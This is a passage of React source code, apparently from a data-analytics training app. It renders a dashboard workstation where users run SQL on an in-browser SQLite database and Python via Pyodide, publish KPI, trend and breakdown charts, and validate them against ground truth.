            <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 16 }}>
              {[
                { label: "Total Rows",     value: stats.total,     icon: "📋", color: T.blue },
                { label: "NULL / Empty",   value: stats.nullCount, icon: "⚠️", color: T.red },
                { label: "Duplicate IDs",  value: stats.dupes,     icon: "🔁", color: T.amber },
              ].map(kpi => (
                <div key={kpi.label} style={{ background: T.bg, borderRadius: 10, padding: "12px 14px", border: `1px solid ${T.border}`, boxShadow: "0 1px 3px rgba(0,0,0,0.05)" }}>
                  <div style={{ fontSize: 18 }}>{kpi.icon}</div>
                  <div style={{ fontSize: 22, fontWeight: 800, color: kpi.color, marginTop: 4 }}>{kpi.value}</div>
                  <div style={{ fontSize: 10, color: T.ink3, marginTop: 2 }}>{kpi.label}</div>
                </div>
              ))}
            </div>
            {stats.numericCols.length > 0 && (
              <>
                <div style={{ fontSize: 11, fontWeight: 800, color: T.ink, marginBottom: 8 }}>Numeric Column Stats</div>
                <table style={{ borderCollapse: "collapse", fontSize: 11, width: "100%" }}>
                  <thead>
                    <tr style={{ background: "#217346", color: "#ffffff" }}>
                      {["Column","Count","Mean","Min","Max"].map(h => (
                        <th key={h} style={{ padding: "6px 12px", textAlign: "left", fontWeight: 700 }}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {stats.numericCols.map((nc, i) => (
                      <tr key={nc.col} style={{ background: i % 2 ? T.bg : T.bg2, borderBottom: "1px solid #D0D0D0" }}>
                        <td style={{ padding: "5px 12px", fontWeight: 700, fontFamily: "monospace" }}>{nc.col}</td>
                        <td style={{ padding: "5px 12px" }}>{nc.count}</td>
                        <td style={{ padding: "5px 12px" }}>{nc.mean}</td>
                        <td style={{ padding: "5px 12px" }}>{nc.min}</td>
                        <td style={{ padding: "5px 12px" }}>{nc.max}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 8. DASHBOARD WORKSTATION — real BI workflow on a live SQLite database.
//    Data tab    : real rows, real row counts, quality issues computed from DB
//    Build tab   : SQL executes for real; Python runs via Pyodide;
//                  results are PUBLISHED to the dashboard
//    Present tab : KPI cards & charts render from YOUR query results
//    Validate    : compares your published numbers to ground truth
// ─────────────────────────────────────────────────────────────────────────────

// Generic chart helpers — render whatever the user's query returned
function resultToXY(rs) {
  if (!rs || !rs.values?.length) return null
  const isNumCol = ci => rs.values.every(r => {
    const v = r[ci]
    if (v === null) return false
    return typeof v === "number" || (!isNaN(parseFloat(v)) && String(v).trim() !== "")
  })
  let xi = -1
  for (let i = 0; i < rs.columns.length; i++) if (!isNumCol(i)) { xi = i; break }
  if (xi < 0) xi = 0
  let yi = -1
  for (let i = 0; i < rs.columns.length; i++) if (i !== xi && isNumCol(i)) { yi = i; break }
  if (yi < 0) return null
  const pts = rs.values
    .filter(r => r[xi] !== null && r[xi] !== undefined)        // drop null labels
    .slice(0, 12)
    .map(r => ({ x: String(r[xi]), y: parseFloat(r[yi]) || 0 }))
  if (!pts.length) return null
  return { pts, xLabel: rs.columns[xi], yLabel: rs.columns[yi] }
}

function UserTrendChart({ rs, chartType }) {
  const xy = resultToXY(rs)
  if (!xy) return <EmptyChartState label="Published result needs one label column + one numeric column — and no NULL values. Check your JOIN keys and date filters." />
  if (xy.pts.length < 2) return <EmptyChartState label={`Your published TREND result has only ${xy.pts.length} row — a trend needs one row per month. Publish a GROUP BY strftime('%Y-%m', order_date) query instead.`} />
  const { pts, yLabel } = xy
  const maxVal = Math.max(...pts.map(p => p.y), 1)
  const W = 360, plotW = 340, n = pts.length
  const slot = plotW / n
  return (
    <svg viewBox={`0 0 ${W} 132`} style={{ width: "100%" }}>
      {[25, 50, 75, 100].map(pct => (
        <line key={pct} x1={10} y1={110 - pct} x2={W - 5} y2={110 - pct} stroke="#F3F4F6" strokeWidth={0.8} />
      ))}
      {chartType === "bar"
        ? pts.map((p, i) => {
            const bh = Math.max(2, Math.round((p.y / maxVal) * 100))
            const x = 12 + i * slot
            return (
              <g key={i}>
                <rect x={x} y={110 - bh} width={Math.max(8, slot - 12)} height={bh} fill="#2563EB" rx={3} opacity={0.85} />
                <text x={x + Math.max(8, slot - 12) / 2} y={124} textAnchor="middle" fontSize={8} fill="#A8A29E">{p.x.slice(0, 8)}</text>
                <text x={x + Math.max(8, slot - 12) / 2} y={106 - bh} textAnchor="middle" fontSize={7.5} fontWeight="700" fill="#1E40AF">{formatMetric(p.y, yLabel)}</text>
              </g>
            )
          })
        : (() => {
            const coords = pts.map((p, i) => [12 + i * slot + slot / 2, 110 - Math.round((p.y / maxVal) * 100)])
            const ptStr = coords.map(c => c.join(",")).join(" ")
            const area = `${coords[0][0]},110 ${ptStr} ${coords[coords.length - 1][0]},110`
            return (
              <>
                <polygon points={area} fill="#2563EB" opacity={0.08} />
                <polyline points={ptStr} fill="none" stroke="#2563EB" strokeWidth={2.5} />
                {coords.map(([x, y], i) => (
                  <g key={i}>
                    <circle cx={x} cy={y} r={3.5} fill="#2563EB" />
                    <text x={x} y={y - 7} textAnchor="middle" fontSize={7.5} fontWeight="700" fill="#1E40AF">{formatMetric(pts[i].y, yLabel)}</text>
                    <text x={x} y={124} textAnchor="middle" fontSize={8} fill="#A8A29E">{pts[i].x.slice(0, 8)}</text>
                  </g>
                ))}
              </>
            )
          })()
      }
      <line x1={10} y1={110} x2={W - 5} y2={110} stroke="#E8E3DA" strokeWidth={1} />
    </svg>
  )
}

const DONUT_COLORS = ["#2563EB", "#D97706", "#16A34A", "#9333EA", "#DC2626", "#0891B2", "#CA8A04", "#6B6560"]

function UserDonut({ rs }) {
  const xy = resultToXY(rs)
  if (!xy) return <EmptyChartState label="Published result needs one label column + one numeric column — and no NULL group names. If every group is null, your aggregation matched no data." />
  const rows = xy.pts.slice(0, 8).filter(r => r.x !== "null" && r.x !== "undefined")
  const realTotal = rows.reduce((a, r) => a + Math.max(0, r.y), 0)
  if (!rows.length || realTotal === 0) {
    return <EmptyChartState label="All published breakdown values are 0 or NULL — your query matched no rows. Check the Data tab's coverage window and your JOIN keys, then re-run and re-publish." />
  }
  const total = realTotal || 1
  let angle = -90
  return (
    <>
      <svg viewBox="0 0 140 130" style={{ width: 110, display: "block", margin: "0 auto 10px" }}>
        {rows.map((seg, i) => {
          const sweep = (Math.max(0, seg.y) / total) * 360
          const r = 52, cx = 70, cy = 65
          const toRad = d => (d * Math.PI) / 180
          const x1 = cx + r * Math.cos(toRad(angle)), y1 = cy + r * Math.sin(toRad(angle))
          angle += Math.min(sweep, 359.9)
          const x2 = cx + r * Math.cos(toRad(angle)), y2 = cy + r * Math.sin(toRad(angle))
          const d = `M${cx},${cy} L${x1},${y1} A${r},${r} 0 ${sweep > 180 ? 1 : 0} 1 ${x2},${y2} Z`
          return <path key={i} d={d} fill={DONUT_COLORS[i % DONUT_COLORS.length]} opacity={0.9} />
        })}
        <circle cx={70} cy={65} r={26} fill="#F8F7F4" />
      </svg>
      {rows.map((seg, i) => (
        <div key={i} style={{ display: "flex", gap: 7, alignItems: "center", marginBottom: 5 }}>
          <div style={{ width: 9, height: 9, borderRadius: "50%", background: DONUT_COLORS[i % DONUT_COLORS.length], flexShrink: 0 }} />
          <span style={{ fontSize: 10, color: "#475569", flex: 1 }}>{seg.x}</span>
          <span style={{ fontSize: 11, fontWeight: 700, color: "#1A1714", fontVariantNumeric: "tabular-nums" }}>{Math.round((Math.max(0, seg.y) / total) * 100)}%</span>
        </div>
      ))}
    </>
  )
}

function EmptyChartState({ label }) {
  return (
    <div style={{ minHeight: 100, display: "flex", alignItems: "center", justifyContent: "center", border: "1.5px dashed #D6D0C8", borderRadius: 8, padding: 14 }}>
      <span style={{ fontSize: 10.5, color: "#A8A29E", textAlign: "center", lineHeight: 1.5 }}>{label}</span>
    </div>
  )
}

const DASH_SQL_SCAFFOLD = `-- Build the dashboard from the live SQLite database. Your SQL really runs.
-- Tables: orders(order_id, customer_id, product_id, order_date, quantity, amount, category, status, city)
--         products(product_id, name, category, price)
--         customers(customer_id, name, city, signup_date)
-- Tip: dates are TEXT 'YYYY-MM-DD' — use strftime('%Y-%m', order_date) for months.

-- 1) KPIs → run, then publish the result as KPI
--    TODO: total_orders, total_revenue, avg_order_value (careful: some amounts are NULL)


-- 2) Monthly trend → publish as TREND
--    TODO: GROUP BY month


-- 3) Breakdown → publish as BREAKDOWN
--    TODO: revenue by category, or High/Mid/Low customer segments
`

const DASH_PY_SCAFFOLD = `import pandas as pd
import matplotlib.pyplot as plt

# df is preloaded from /data/orders.csv — the SAME data your SQL queries.
print(df.head())
print('rows:', len(df))

# TODO 1: clean — NULL amounts, duplicate order_ids, inconsistent city casing
# TODO 2: KPIs — total revenue, total orders, AOV, MoM growth
# TODO 3: charts — monthly trend, top-5 products (figures render below)
`

function DashboardWorkstation({ mission, code, onCodeChange }) {
  const [wsTab, setWsTab]           = useState("data")
  const [schemaInfo, setSchemaInfo] = useState(null)
  const [preview, setPreview]       = useState(null)
  const [quality, setQuality]       = useState(null)
  const [engineErr, setEngineErr]   = useState(null)

  const [sqlCode, setSqlCode]       = useState("")
  const [sqlOut, setSqlOut]         = useState(null)
  const [sqlErr, setSqlErr]         = useState(null)
  const [sqlRunning, setSqlRunning] = useState(false)

  const [published, setPublished]   = useState({ kpi: null, trend: null, breakdown: null })
  const publishedRef = useRef(published)
  useEffect(() => { publishedRef.current = published }, [published])

  const [pyCode, setPyCode]         = useState("")
  const [pyOut, setPyOut]           = useState(null)
  const [pyStatus, setPyStatus]     = useState(null)
  const [pyRunning, setPyRunning]   = useState(false)

  const [chartType, setChartType]   = useState("bar")
  const [insights, setInsights]     = useState({ trend: "", segment: "", concern: "", action: "" })
  const [validation, setValidation] = useState(null)
  const [validating, setValidating] = useState(false)

  // ── Load real data on mount ──
  useEffect(() => {
    let alive = true
    Promise.all([
      getSchema(mission),
      runQuery(mission, "SELECT * FROM orders LIMIT 8"),
      getDataQuality(mission),
    ]).then(([s, p, q]) => {
      if (!alive) return
      setSchemaInfo(s); setPreview(p.resultSets[0]); setQuality(q)
    }).catch(e => alive && setEngineErr(e.message))
    return () => { alive = false }
  }, [mission])

  // ── Register the real validator so Arena's "Validate Metrics" works ──
  useEffect(() => {
    const unregister = registerValidator(() => validateMetrics(mission, publishedRef.current))
    return unregister
  }, [mission])

  // ── shell action bus: ▶ Run Query (Build tab) + dashboard proof draft ──
  const busRef = useRef({})
  useEffect(() => {
    const unRun = registerRunner(() => busRef.current.runSql?.())
    const unProof = registerProofProvider(() => {
      const { sqlCode: sc, pyOut: po, insights: ins, published: pub } = busRef.current
      const artifacts = []
      const pubLines = ["kpi", "trend", "breakdown"].map(slot => {
        const rs = pub?.[slot]
        if (!rs) return `○ ${slot.toUpperCase()} — not published`
        return `✓ ${slot.toUpperCase()} (${rs.rowCount} rows) — ${rs.columns.join(", ")}`
      })
      artifacts.push({ type: "report", label: "Dashboard state (published panels)", content: pubLines.join("\n") })
      if (sc?.trim()) artifacts.push({ type: "code", label: "SQL queries", content: sc })
      const insText = ["trend", "segment", "concern", "action"]
        .filter(k => ins?.[k]).map(k => `${k.toUpperCase()}: ${ins[k]}`).join("\n\n")
      if (insText) artifacts.push({ type: "narrative", label: "Analyst insights", content: insText })
      ;(po?.images || []).forEach((img, i) =>
        artifacts.push({ type: "image", label: `Python figure ${i + 1}`, content: `data:image/png;base64,${img}` }))
      return { headline: mission?.title || "Dashboard analysis", artifacts }
    })
    return () => { unRun(); unProof() }
  }, []) // eslint-disable-line

  // ── Persist all work into `code` for AI evaluation ──
  useEffect(() => {
    const pubSummary = ["kpi", "trend", "breakdown"].map(slot => {
      const rs = published[slot]
      if (!rs) return `- ${slot.toUpperCase()}: not published`
      const head = rs.values.slice(0, 6).map(r => r.join(" | ")).join("\n")
      return `- ${slot.toUpperCase()} (${rs.rowCount} rows):\ncolumns: ${rs.columns.join(", ")}\n${head}`
    }).join("\n")
    const parts = [
      `# Dashboard Analysis Workspace (live SQLite engine)`,
      sqlCode ? `\n## SQL Queries\n\`\`\`sql\n${sqlCode}\n\`\`\`` : "",
      `\n## Published Dashboard Results\n${pubSummary}`,
      pyCode ? `\n## Python Analysis\n\`\`\`python\n${pyCode}\n\`\`\`` : "",
      pyOut?.stdout ? `\n## Python Output\n\`\`\`\n${pyOut.stdout.slice(0, 1500)}\n\`\`\`` : "",
      `\n## Analyst Insights`,
      insights.trend   ? `**Trend:** ${insights.trend}` : "",
      insights.segment ? `**Segment Leader:** ${insights.segment}` : "",
      insights.concern ? `**Concern:** ${insights.concern}` : "",
      insights.action  ? `**Recommended Action:** ${insights.action}` : "",
    ].filter(Boolean)
    onCodeChange(parts.join("\n"))
  }, [sqlCode, pyCode, pyOut, published, insights]) // eslint-disable-line

  const runSql = async () => {
    if (!sqlCode.trim() || sqlRunning) return
    setSqlRunning(true); setSqlErr(null)
    try {
      const out = await runQuery(mission, sqlCode)
      setSqlOut(out)
    } catch (e) { setSqlOut(null); setSqlErr(e.message) }
    setSqlRunning(false)
  }

  const runPy = async () => {
    if (!pyCode.trim() || pyRunning) return
    setPyRunning(true); setPyOut(null)
    try {
      const out = await runPython(mission, pyCode, setPyStatus)
      setPyOut(out)
    } catch (e) { setPyOut({ stdout: "", error: `Python runtime failed: ${e.message}`, images: [] }) }
    setPyStatus(null); setPyRunning(false)
  }

  const publish = (slot, rs) => setPublished(prev => ({ ...prev, [slot]: prev[slot] === rs ? null : rs }))

  const runValidation = async () => {
    setValidating(true)
    try { setValidation(await validateMetrics(mission, publishedRef.current)) }
    catch (e) { setValidation([{ passed: false, input: "Validation", expected: "", actual: e.message }]) }
    setValidating(false)
  }

  const labelStyle = { fontSize: 9, fontWeight: 800, color: "#A8A29E", letterSpacing: 0.7, textTransform: "uppercase", marginBottom: 6 }
  const cardStyle  = { background: "#ffffff", borderRadius: 11, padding: "12px 14px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", border: "1px solid #E2DED7" }
  const sectionHdr = (label, icon) => (
    <div style={{ display: "flex", alignItems: "center", gap: 7, marginBottom: 10 }}>
      <span style={{ fontSize: 14 }}>{icon}</span>
      <span style={{ fontSize: 11, fontWeight: 800, color: "#1A1714", letterSpacing: -0.2 }}>{label}</span>
    </div>
  )

  const kpiCards = (() => {
    const rs = published.kpi
    if (!rs || !rs.values.length) return null
    return rs.columns.slice(0, 6).map((col, ci) => ({ label: col, value: formatMetric(rs.values[0][ci], col), isNull: rs.values[0][ci] === null }))
  })()
  const kpiAllNull = kpiCards && kpiCards.every(k => k.isNull || k.value === "0")

  const orderCount = schemaInfo?.find(t => t.table === "orders")?.rowCount

  busRef.current = { runSql, sqlCode, pyOut, insights, published }

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0, fontFamily: "'DM Sans',sans-serif", background: "#F8F7F4" }}>

      {/* ── Workspace tab bar ── */}
      <div style={{ display: "flex", background: "#ffffff", borderBottom: "1px solid #E2DED7", flexShrink: 0 }}>
        {[
          { id: "data",    icon: "🗄️", label: "Data",    hint: "Inspect & profile" },
          { id: "build",   icon: "🔧", label: "Build",   hint: "SQL · Python · Publish" },
          { id: "present", icon: "📊", label: "Present", hint: "Your dashboard + insights" },
        ].map(t => (
          <button key={t.id} onClick={() => setWsTab(t.id)} style={{
            padding: "0 20px", height: 44, border: "none", background: "none",
            borderBottom: wsTab === t.id ? "2.5px solid #2563EB" : "2.5px solid transparent",
            display: "flex", alignItems: "center", gap: 7, cursor: "pointer", fontFamily: "inherit",
          }}>
            <span style={{ fontSize: 14 }}>{t.icon}</span>
            <div style={{ textAlign: "left" }}>
              <div style={{ fontSize: 12, fontWeight: wsTab === t.id ? 800 : 500, color: wsTab === t.id ? "#1E62B5" : "#4A4540" }}>{t.label}</div>
              <div style={{ fontSize: 9, color: "#9A948E", lineHeight: 1 }}>{t.hint}</div>
            </div>
          </button>
        ))}
        <div style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: 6, paddingRight: 14 }}>
          {["kpi", "trend", "breakdown"].map(slot => (
            <span key={slot} style={{
              fontSize: 9, fontWeight: 700, padding: "3px 9px", borderRadius: 99,
              background: published[slot] ? "#DCFCE7" : "#F3F4F6",
              color: published[slot] ? "#15803D" : "#A8A29E",
              border: `1px solid ${published[slot] ? "#BBF7D0" : "#E8E3DA"}`,
            }}>{published[slot] ? "✓" : "○"} {slot.toUpperCase()}</span>
          ))}
        </div>
      </div>

      {engineErr && (
        <div style={{ padding: "8px 14px", background: "#FEF2F2", borderBottom: "1px solid #FECACA", fontSize: 11, color: "#DC2626" }}>
          Database engine failed to load: {engineErr} — check your network (sql.js loads from CDN).
        </div>
      )}

      {/* ══════════════ TAB 1 — DATA (everything below is from the real DB) ══════════════ */}
      {wsTab === "data" && (
        <div style={{ flex: 1, overflow: "auto", padding: 14, display: "flex", gap: 12, minHeight: 0 }}>
          <div style={{ width: 250, flexShrink: 0, display: "flex", flexDirection: "column", gap: 10 }}>
            <div style={cardStyle}>
              {sectionHdr("Live Schema", "📋")}
              {!schemaInfo && <div style={{ fontSize: 10, color: "#A8A29E" }}>Loading database…</div>}
              {(schemaInfo || []).map(t => (
                <div key={t.table} style={{ marginBottom: 10 }}>
                  <div style={{ fontSize: 10, fontWeight: 800, color: "#1D4ED8", marginBottom: 3, fontFamily: "monospace" }}>
                    {t.table} <span style={{ color: "#A8A29E", fontWeight: 400 }}>· {t.rowCount.toLocaleString()} rows</span>
                  </div>
                  {t.columns.map(c => (
                    <div key={c.name} style={{ fontSize: 10, paddingLeft: 8, color: "#A8A29E", display: "flex", justifyContent: "space-between" }}>
                      <span style={{ fontFamily: "monospace", color: "#475569" }}>{c.name}</span>
                      <span style={{ fontSize: 9, color: "#A8A29E" }}>{c.type}</span>
                    </div>
                  ))}
                </div>
              ))}
            </div>
            <div style={cardStyle}>
              {sectionHdr("Data Quality (computed live)", "🔍")}
              <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
                {(quality || []).map((q, i) => (
                  <div key={i} style={{ display: "flex", gap: 6, alignItems: "flex-start", padding: "5px 7px", borderRadius: 6, background: q.fixed ? "#F0FDF4" : "#FEF2F2", border: `1px solid ${q.fixed ? "#BBF7D0" : "#FECACA"}` }}>
                    <span style={{ fontSize: 11, flexShrink: 0 }}>{q.icon}</span>
                    <span style={{ fontSize: 10, color: q.fixed ? "#15803D" : "#DC2626", lineHeight: 1.4 }}>{q.label}</span>
                  </div>
                ))}
                {!quality && <div style={{ fontSize: 10, color: "#A8A29E" }}>Profiling data…</div>}
              </div>
            </div>
          </div>

          <div style={{ flex: 1, ...cardStyle, overflow: "hidden", display: "flex", flexDirection: "column" }}>
            {sectionHdr(`Sample Data — orders${orderCount ? ` (showing 8 of ${orderCount.toLocaleString()} rows)` : ""}`, "📄")}
            <div style={{ overflow: "auto", flex: 1 }}>
              {preview && (
                <table style={{ borderCollapse: "collapse", fontSize: 11, width: "100%" }}>
                  <thead>
                    <tr style={{ background: "#1E3A5F" }}>
                      {preview.columns.map(c => (
                        <th key={c} style={{ padding: "6px 10px", textAlign: "left", color: "#ffffff", fontWeight: 700, fontSize: 10, whiteSpace: "nowrap" }}>{c}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {preview.values.map((row, ri) => (
                      <tr key={ri} style={{ background: ri % 2 ? "#F8F7F4" : "#F1EFE9", borderBottom: "1px solid #E2DED7" }}>
                        {row.map((cell, ci) => {
                          const isNull = cell === null
                          return (
                            <td key={ci} style={{
                              padding: "5px 10px", whiteSpace: "nowrap",
                              color: isNull ? "#DC2626" : T.ink, fontWeight: isNull ? 700 : 400,
                              background: isNull ? "#FEF2F2" : "inherit",
                            }}>{isNull ? "NULL ⚠" : formatCell(cell)}</td>
                          )
                        })}
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
              {!preview && <div style={{ fontSize: 11, color: "#A8A29E", padding: 10 }}>Loading rows…</div>}
            </div>
            <div style={{ padding: "6px 10px", borderTop: "1px solid #E2DED7", fontSize: 9, color: "#9A948E", background: "#F1EFE9" }}>
              This is a real SQLite database — query it from the Build tab. Quality issues above were computed from the actual rows.
            </div>
          </div>
        </div>
      )}

      {/* ══════════════ TAB 2 — BUILD ══════════════ */}
      {wsTab === "build" && (
        <div style={{ flex: 1, display: "flex", gap: 0, overflow: "hidden", minHeight: 0 }}>
          {/* Left: SQL editor + live results */}
          <div style={{ flex: 1.2, display: "flex", flexDirection: "column", borderRight: "1px solid #E8E3DA", overflow: "hidden" }}>
            <div style={{ padding: "7px 12px", background: "#F8F7F4", borderBottom: "1px solid #E2DED7", display: "flex", alignItems: "center", gap: 8, flexShrink: 0 }}>
              <div style={{ display: "flex", gap: 4 }}>
                {["#EF4444", "#F59E0B", "#22C55E"].map((c, i) => <div key={i} style={{ width: 7, height: 7, borderRadius: "50%", background: c }} />)}
              </div>
              <span style={{ fontSize: 9, color: "#9A948E", fontFamily: "monospace" }}>SQL — executes against the live database</span>
              <button onClick={() => setSqlCode(DASH_SQL_SCAFFOLD)} style={{ marginLeft: "auto", padding: "2px 8px", borderRadius: 4, border: "1px solid #E2DED7", background: "#F1EFE9", color: "#9A948E", fontSize: 9, cursor: "pointer" }}>Load scaffold</button>
              <button onClick={runSql} disabled={sqlRunning} style={{ padding: "2px 12px", borderRadius: 4, border: "none", background: sqlRunning ? "#9A948E" : "#2D8653", color: "#ffffff", fontSize: 9, fontWeight: 700, cursor: sqlRunning ? "wait" : "pointer" }}>
                {sqlRunning ? "⟳ Running…" : "▶ Run SQL"}
              </button>
            </div>
            <textarea
              value={sqlCode}
              onChange={e => setSqlCode(e.target.value)}
              onKeyDown={e => { if ((e.metaKey || e.ctrlKey) && e.key === "Enter") { e.preventDefault(); runSql() } }}
              placeholder={"-- Write SQL and press ▶ Run SQL (or ⌘/Ctrl+Enter).\n-- It executes for real — wrong SQL gives a real error.\nSELECT * FROM orders LIMIT 10;"}
              spellCheck={false}
              style={{ flex: "0 0 45%", background: "#F7F6F3", color: "#1A1714", fontFamily: "'DM Mono',monospace", fontSize: 12, lineHeight: 1.65, padding: "10px 14px", border: "none", outline: "none", resize: "none", boxSizing: "border-box" }}
            />
            {/* Real results + publish controls */}
            <div style={{ flex: 1, overflow: "auto", background: "#F8F7F4", borderTop: "1px solid #E2DED7" }}>
              <div style={{ padding: "5px 12px", fontSize: 9, fontWeight: 800, color: sqlErr ? "#D14343" : "#9A948E", textTransform: "uppercase", letterSpacing: 0.6, background: "#F1EFE9", borderBottom: "1px solid #E2DED7", position: "sticky", top: 0 }}>
                {sqlErr ? "✗ SQL Error" : sqlOut ? `✓ ${sqlOut.resultSets.length} result set${sqlOut.resultSets.length === 1 ? "" : "s"} in ${sqlOut.ms}ms — publish them to your dashboard →` : "Results appear here after ▶ Run SQL"}
              </div>
              {sqlErr && <pre style={{ margin: 0, padding: "10px 14px", fontFamily: "monospace", fontSize: 11, color: "#DC2626", whiteSpace: "pre-wrap" }}>{sqlErr}</pre>}
              {sqlOut && sqlOut.resultSets.map((rs, i) => (
                <div key={i} style={{ borderBottom: "1px solid #F3F4F6" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "5px 12px", background: "#F1EFE9" }}>
                    <span style={{ fontSize: 9, fontWeight: 800, color: "#4A4540" }}>Result {i + 1} · {rs.rowCount} rows</span>
                    <span style={{ fontSize: 9, color: "#9A948E", marginRight: "auto" }}>{rs.columns.join(", ").slice(0, 60)}</span>
                    {[["kpi", "📌 KPI"], ["trend", "📈 Trend"], ["breakdown", "🥧 Breakdown"]].map(([slot, lbl]) => (
                      <button key={slot} onClick={() => publish(slot, rs)} style={{
                        padding: "2px 8px", borderRadius: 4, fontSize: 9, fontWeight: 700, cursor: "pointer",
                        border: `1px solid ${published[slot] === rs ? "#2D8653" : "#E2DED7"}`,
                        background: published[slot] === rs ? "#E6F4ED" : "#ffffff",
                        color: published[slot] === rs ? "#2D8653" : "#9A948E",
                      }}>{published[slot] === rs ? "✓ " : ""}{lbl}</button>
                    ))}
                  </div>
                  <div style={{ maxHeight: 160, overflow: "auto" }}>
                    <table style={{ borderCollapse: "collapse", fontSize: 10.5, width: "100%" }}>
                      <thead>
                        <tr style={{ background: "#F2EDE4" }}>
                          {rs.columns.map(c => <th key={c} style={{ padding: "4px 9px", textAlign: "left", fontWeight: 700, color: "#475569", whiteSpace: "nowrap" }}>{c}</th>)}
                        </tr>
                      </thead>
                      <tbody>
                        {rs.values.slice(0, 50).map((row, ri) => (
                          <tr key={ri} style={{ borderTop: "1px solid #F3F4F6" }}>
                            {row.map((cell, ci) => <td key={ci} style={{ padding: "3px 9px", color: cell === null ? "#DC2626" : T.ink, whiteSpace: "nowrap" }}>{formatCell(cell)}</td>)}
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Right: Python (real, via Pyodide) */}
          <div style={{ width: 380, flexShrink: 0, display: "flex", flexDirection: "column", overflow: "hidden" }}>
            <div style={{ padding: "6px 12px", background: "#F8F7F4", borderBottom: "1px solid #E2DED7", display: "flex", alignItems: "center", gap: 8, flexShrink: 0 }}>
              <span style={{ fontSize: 9, color: "#9A948E", fontFamily: "monospace" }}>Python — real pandas/matplotlib (Pyodide)</span>
              <button onClick={() => setPyCode(DASH_PY_SCAFFOLD)} style={{ marginLeft: "auto", padding: "2px 7px", borderRadius: 4, border: "1px solid #E2DED7", background: "#F1EFE9", color: "#9A948E", fontSize: 9, cursor: "pointer" }}>Load scaffold</button>
              <button onClick={runPy} disabled={pyRunning} style={{ padding: "2px 12px", borderRadius: 4, border: "none", background: pyRunning ? "#9A948E" : "#1E62B5", color: "#ffffff", fontSize: 9, fontWeight: 700, cursor: pyRunning ? "wait" : "pointer" }}>
                {pyRunning ? "⟳" : "▶ Run"}
              </button>
            </div>
            <textarea
              value={pyCode}
              onChange={e => setPyCode(e.target.value)}
              placeholder={"# Real Python — df preloaded from /data/orders.csv\n# First run downloads the runtime (~15 MB, cached after).\nprint(df.head())"}
              spellCheck={false}
              style={{ flex: "0 0 45%", background: "#F7F6F3", color: "#1A1714", fontFamily: "'DM Mono',monospace", fontSize: 11.5, lineHeight: 1.65, padding: "10px 14px", border: "none", outline: "none", resize: "none", boxSizing: "border-box" }}
            />
            <div style={{ flex: 1, overflow: "auto", background: "#F8F7F4", borderTop: "1px solid #E2DED7" }}>
              <div style={{ padding: "5px 12px", fontSize: 9, fontWeight: 800, color: pyOut?.error ? "#D14343" : "#9A948E", textTransform: "uppercase", letterSpacing: 0.6, background: "#F1EFE9", borderBottom: "1px solid #E2DED7" }}>
                {pyRunning ? (pyStatus || "⟳ Running…") : pyOut ? (pyOut.error ? "✗ Traceback" : "✓ Python output") : "Output"}
              </div>
              {pyOut && (
                <div style={{ padding: "8px 12px" }}>
                  {pyOut.stdout && <pre style={{ margin: 0, fontFamily: "monospace", fontSize: 10.5, color: T.ink, whiteSpace: "pre-wrap", lineHeight: 1.5 }}>{pyOut.stdout}</pre>}
                  {pyOut.error && <pre style={{ margin: "6px 0 0", fontFamily: "monospace", fontSize: 10.5, color: "#DC2626", whiteSpace: "pre-wrap", lineHeight: 1.5 }}>{pyOut.error}</pre>}
                  {(pyOut.images || []).map((img, i) => (
                    <img key={i} src={`data:image/png;base64,${img}`} alt={`figure ${i + 1}`} style={{ maxWidth: "100%", marginTop: 8, border: "1px solid #E8E3DA", borderRadius: 6 }} />
                  ))}
                </div>
              )}
              {!pyOut && !pyRunning && (
                <div style={{ padding: "10px 12px", fontSize: 10, color: "#A8A29E", lineHeight: 1.6 }}>
                  Optional deep-dive: clean the data and chart it with real pandas + matplotlib. Figures render here as images.
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ══════════════ TAB 3 — PRESENT: built from YOUR published results ══════════════ */}
      {wsTab === "present" && (
        <div style={{ flex: 1, overflow: "auto", padding: 14, display: "flex", flexDirection: "column", gap: 12 }}>

          {/* KPI Cards — from the user's published KPI query */}
          <div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div style={labelStyle}>📌 KPI Cards — from your published KPI query</div>
              <button onClick={runValidation} disabled={validating} style={{ padding: "4px 12px", borderRadius: 6, border: "1px solid #BBF7D0", background: "#F0FDF4", color: "#15803D", fontSize: 10, fontWeight: 800, cursor: "pointer", marginBottom: 6 }}>
                {validating ? "⟳ Validating…" : "✓ Validate against ground truth"}
              </button>
            </div>
            {kpiCards ? (
              <div style={{ display: "grid", gridTemplateColumns: `repeat(${Math.min(kpiCards.length, 4)},1fr)`, gap: 10 }}>
                {kpiCards.map(kpi => (
                  <div key={kpi.label} style={{ background: "#ffffff", borderRadius: 11, padding: "12px 14px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", border: "1px solid #E2DED7" }}>
                    <div style={{ fontSize: 10, color: "#9A948E", fontWeight: 600, marginBottom: 5, fontFamily: "monospace" }}>{kpi.label}</div>
                    <div style={{ fontSize: 19, fontWeight: 900, color: "#1A1714", fontVariantNumeric: "tabular-nums" }}>{kpi.value}</div>
                  </div>
                ))}
              </div>
            ) : (
              <EmptyChartState label="No KPIs yet — go to Build, run your KPI query, and publish it as 📌 KPI" />
            )}
            {kpiAllNull && (
              <div style={{ marginTop: 8, padding: "9px 13px", background: "#FEF2F2", border: "1px solid #FECACA", borderRadius: 9, fontSize: 11, color: "#DC2626", lineHeight: 1.55 }}>
                ⚠️ Your published KPI values are all NULL/0 — the query matched no rows. Check the <strong>Data tab's coverage window</strong> (your date filter may fall outside it) and your JOIN keys, then re-run and re-publish.
              </div>
            )}
          </div>

          {/* Validation results */}
          {validation && (
